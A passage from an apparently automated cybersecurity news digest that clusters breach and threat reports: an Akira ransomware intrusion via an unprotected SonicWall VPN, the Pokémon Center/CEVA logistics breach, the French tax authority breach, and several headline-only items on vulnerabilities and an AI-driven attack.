anti-EDR trick appears to have sabotaged their ransomware. The Attack Chain at a Glance Figure 1: End-to-end timeline of the intrusion Technical Details Initial Access: SonicWall SSL VPN, No MFA The intrusion started where many Akira intrusions start: a SonicWall SSL VPN. Beginning around 03:45 UTC on August 4, 2026, the SonicWall logged a burst of failed logins (Unknown User Login Attempt / "User login denied due to bad credentials") against multiple usernames from several external IPs: a straightforward credential spray. Roughly seven minutes later, at 03:52:42 UTC, an attempt succeeded: a valid VPN account logged in from an external IP to an SSL VPN with no multi-factor authentication (MFA) in front of it. Figure 2: SonicWall log showing the spray (msg 33) resolving into a successful SSL VPN login (msg 1080). Living on the Domain Controller: Recon, the Akira Way That successful login predates any hands-on-keyboard action by nearly two hours. Then th
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Akira Hits Safe Mode: Ransomware Rebooting Around EDR
  - Published: 2026-08-12T13:00:00+00:00
  - Link: https://www.huntress.com/blog/akira-hits-safe-mode-ransomware-rebooting-around-edr
  - Summary: An Akira affiliate rebooted into Safe Mode to kill EDR and Defender, then Safe Mode broke their own ransomware. Here’s the full attack chain.

### Cluster b403b325bc — score 8

- Title: Pokémon Center data breach exposes customer info, cancels some orders
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-08-17T19:12:39+00:00
- Link: https://www.bleepingcomputer.com/news/security/pokemon-center-data-breach-exposes-customer-info-cancels-some-orders/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Pokémon Center is notifying customers in the United Kingdom and Germany that it suffered a third-party data breach after hackers stole customer personal and order information from third-party logistics provider CEVA Logistics. [...]
```

#### Full body

```
Pokémon Center data breach exposes customer info, cancels some orders By Lawrence Abrams August 17, 2026 03:12 PM 0 Pokémon Center is notifying customers in the United Kingdom and Germany that it suffered a third-party data breach after hackers stole customer personal and order information from third-party logistics provider CEVA Logistics. While CEVA's systems were compromised in the cyberattack, the exposed records belonged to Pokémon Center customers who submitted orders on the site. The company then shared this information with the logistics provider to fulfill and ship PokemonCenter.com orders. CEVA Logistics is a subsidiary of the CMA CGM Group, the world's third-largest shipping company. The logistics provider operates 1,000 warehouses, handled 15 million shipments last year, and reported $18.3 billion in revenue in 2025. The company recently suffered a cyberattack in which attackers breached its servers between July 29 and August 1, affecting multiple retailers in Europe . The CEVA breach also affected Valve , which notified Steam hardware customers in Europe that their names, addresses, phone numbers, email addresses, and information about ordered products were stolen during the cyberattack. The Valve breach notification said CEVA said it retains delivery-related information for up to 90 days after an order. However, it is unclear whether the same retention period applies to Pokémon Center customer data. The attack also disrupted eight of its European warehouses, causing shipping delays for many customers. Pokémon Center orders canceled after breach In data breach notification emails seen by BleepingComputer, Pokémon Center says CEVA is the vendor it uses to ship PokemonCenter.com products to customers in the United Kingdom and Germany. "We're sorry to inform you that we have had to cancel your recent order [order number] due to an unforeseen fulfilment issue," reads the Pokémon Center data breach notification. "We are writing to let you know about a cyber incident affecting a Pokémon Center logistics provider that may affect some of your information. CEVA Logistics ("CEVA"), the vendor Pokémon Center utilizes to ship product from PokemonCenter.com for customers in the United Kingdom and Germany, has informed us that unfortunately they were a victim of a cyber attack commencing on 30 July, 2026." Pokémon Center says unauthorized parties may have obtained customers' full names, mailing addresses, phone numbers, email addresses, and details about the contents of their PokemonCenter.com orders. The company says other information related to customers and their orders was not impacted and that CEVA does not have access to customers' payment card details. Pokémon Center is currently displaying a notice on its UK website warning that some orders are experiencing delays and may take longer than usual to process, dispatch, and deliver. Message to UK customers on the Pokémon Center website Source: BleepingComputer However, customers are also reporting that the breach caused their orders to be canceled, although it is unclear why the cyberattack would require cancellations rather than simply delays. While initial reports warned of cancellations for the highly anticipated 30th anniversary collection products, a Reddit post shows that other merchandise, such as the Ghost Chateau Cyndaquil keyring, was affected. Another customer replied that they had also received the same cancellation email. BleepingComputer contacted Pokémon Center and Pokémon media contacts to learn more about the breach and why the incident caused customer orders to be canceled, but has not received a reply. Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: Pokémon Center data breach exposes customer info, cancels some orders
  - Published: 2026-08-17T19:12:39+00:00
  - Link: https://www.bleepingcomputer.com/news/security/pokemon-center-data-breach-exposes-customer-info-cancels-some-orders/
  - Summary: Pokémon Center is notifying customers in the United Kingdom and Germany that it suffered a third-party data breach after hackers stole customer personal and order information from third-party logistics provider CEVA Logistics. [...]

### Cluster 5b5ad8b9f8 — score 8

- Title: French tax authority data breach affects 678,000 individuals
- Source: BleepingComputer (cyber_news_breach_reporting)
- Published: 2026-08-17T10:09:48+00:00
- Link: https://www.bleepingcomputer.com/news/security/french-tax-authority-data-breach-affects-678-000-individuals/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: financial_services
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: financial_services
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
The French Ministry of the Economy and Finance has disclosed a data breach after an attacker accessed the General Directorate of Public Finances (DGFiP) systems and stole data belonging to 678,000 individuals. [...]
```

#### Corroborating sources (1)

- **BleepingComputer** (cyber_news_breach_reporting)
  - Title: French tax authority data breach affects 678,000 individuals
  - Published: 2026-08-17T10:09:48+00:00
  - Link: https://www.bleepingcomputer.com/news/security/french-tax-authority-data-breach-affects-678-000-individuals/
  - Summary: The French Ministry of the Economy and Finance has disclosed a data breach after an attacker accessed the General Directorate of Public Finances (DGFiP) systems and stole data belonging to 678,000 individuals. [...]

### Cluster ff9d8c251f — score 8

- Title: 680,000 Impacted by French Tax Authority Data Breach
- Source: SecurityWeek (cyber_news_breach_reporting)
- Published: 2026-08-17T13:53:55+00:00
- Link: https://www.securityweek.com/680000-impacted-by-french-tax-authority-data-breach/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Hackers used compromised credentials to access enterprise and personal tax-related data. The post 680,000 Impacted by French Tax Authority Data Breach appeared first on SecurityWeek .
```

#### Corroborating sources (1)

- **SecurityWeek** (cyber_news_breach_reporting)
  - Title: 680,000 Impacted by French Tax Authority Data Breach
  - Published: 2026-08-17T13:53:55+00:00
  - Link: https://www.securityweek.com/680000-impacted-by-french-tax-authority-data-breach/
  - Summary: Hackers used compromised credentials to access enterprise and personal tax-related data. The post 680,000 Impacted by French Tax Authority Data Breach appeared first on SecurityWeek .

### Cluster a52785cdd9 — score 8

- Title: Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-08-12T17:05:01+00:00
- Link: https://cyberscoop.com/near-autonomous-ai-attack-government-target-taiwan/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Israeli cyber firm Dream said the framework adapted mid-operation, corrected its mistakes and expanded as it went along. The post Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan appeared first on CyberScoop .
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan
  - Published: 2026-08-12T17:05:01+00:00
  - Link: https://cyberscoop.com/near-autonomous-ai-attack-government-target-taiwan/
  - Summary: Israeli cyber firm Dream said the framework adapted mid-operation, corrected its mistakes and expanded as it went along. The post Researchers observe first ‘near-autonomous’ AI attack on government target in Taiwan appeared first on CyberScoop .

### Cluster 2c8acd9c63 — score 8

- Title: Scottish Govt Suffers Potentially Widening Data Breach at Prosecutor's Office
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-08-14T15:58:50+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/scottish-govt-data-breach-prosecutors-office
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- affected_industries: government
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
One Caledonian government agency reported a breach, thanks to a third party that may have serviced other agencies as well.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Scottish Govt Suffers Potentially Widening Data Breach at Prosecutor's Office
  - Published: 2026-08-14T15:58:50+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/scottish-govt-data-breach-prosecutors-office
  - Summary: One Caledonian government agency reported a breach, thanks to a third party that may have serviced other agencies as well.

### Cluster 388705e7c7 — score 8

- Title: ⚡ Weekly Recap: VMware Exploits, Windows 0-Day, MCP Attacks, Browser Hijacks and More
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-08-17T13:23:51+00:00
- Link: https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- content_type: intel_roundup
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain
- content_type: intel_roundup
- confidence_tier: tier_4_news

#### Summary

```
The expensive attacks are not always the clever ones. This week had plenty of proof. Exposed services got hit, old bugs found fresh use, browser sessions became attack paths, and supply-chain problems kept spreading farther than the original compromise. A lot of it came down to access that was already there and defenses that assumed nobody would look too closely. So, nothing magical. Just a
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ⚡ Weekly Recap: VMware Exploits, Windows 0-Day, MCP Attacks, Browser Hijacks and More
  - Published: 2026-08-17T13:23:51+00:00
  - Link: https://thehackernews.com/2026/08/weekly-recap-vmware-exploits-windows-0.html
  - Summary: The expensive attacks are not always the clever ones. This week had plenty of proof. Exposed services got hit, old bugs found fresh use, browser sessions became attack paths, and supply-chain problems kept spreading farther than the original compromise. A lot of it came down to access that was already there and defenses that assumed nobody would look too closely. So, nothing magical. Just a

### Cluster 945f9da0a0 — score 8

- Title: NASA Ground Control Software Flaw Enables Unauthenticated Commands
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-08-18T14:30:00+00:00
- Link: https://www.infosecurity-magazine.com/news/nasa-ground-control-software-flaw/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Critical AIT-GUI flaws expose spacecraft commands and scripts to unauthenticated attackers
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: NASA Ground Control Software Flaw Enables Unauthenticated Commands
  - Published: 2026-08-18T14:30:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/nasa-ground-control-software-flaw/
  - Summary: Critical AIT-GUI flaws expose spacecraft commands and scripts to unauthenticated attackers

### Cluster 20c2a82904 — score 8

- Title: SafePal Data Breach Hits Tens of Thousands of Customers
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-08-17T09:10:00+00:00
- Link: https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: data_breach
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: SafePal Data Breach Hits Tens of Thousands of Customers
  - Published: 2026-08-17T09:10:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/safepal-data-breach-tens-thousands/
  - Summary: Nearly 40,000 customers of hardware wallet provider SafePal have been impacted by a data breach

### Cluster a0547d74b2 — score 8

- Title: Unauthenticated RCE in CircleCI's MCP server: Host/Origin allowlist bypassed by any non-browser client (GHSA-xv5j-cwgj-22r4)
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-08-17T14:14:44+00:00
- Link: https://www.reddit.com/r/netsec/comments/1vqtjpi/unauthenticated_rce_in_circlecis_mcp_server/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/HyprWave [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Unauthenticated RCE in CircleCI's MCP server: Host/Origin allowlist bypassed by any non-browser client (GHSA-xv5j-cwgj-22r4)
  - Published: 2026-08-17T14:14:44+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1vqtjpi/unauthenticated_rce_in_circlecis_mcp_server/
  - Summary: submitted by /u/HyprWave [link] [comments]
